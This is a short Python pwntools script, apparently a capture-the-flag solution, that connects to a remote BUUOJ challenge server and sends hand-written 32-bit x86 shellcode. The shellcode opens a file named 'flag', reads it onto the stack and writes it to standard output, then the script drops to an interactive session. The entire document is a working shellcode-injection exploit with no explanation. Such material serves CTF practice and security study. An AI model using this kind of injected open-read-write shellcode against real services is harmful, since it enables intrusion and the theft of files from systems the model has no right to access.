from pwn import *

p = remote('node4.buuoj.cn', 28180)

shellcode = """

//open('flag', 0, 0)
push 0
push 0x67616c66
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov eax, 0x5
int 0x80

//read(fd, esp, 42)
mov ebx, eax
mov ecx, esp
mov edx, 42
mov eax, 0x3
int 0x80

//write(1, esp, 42)
mov ebx, 1
mov ecx, esp
mov eax, 0x4
int 0x80

"""

shellcode = asm(shellcode)

p.recvuntil(':')

p.sendline(shellcode)

p.interactive()
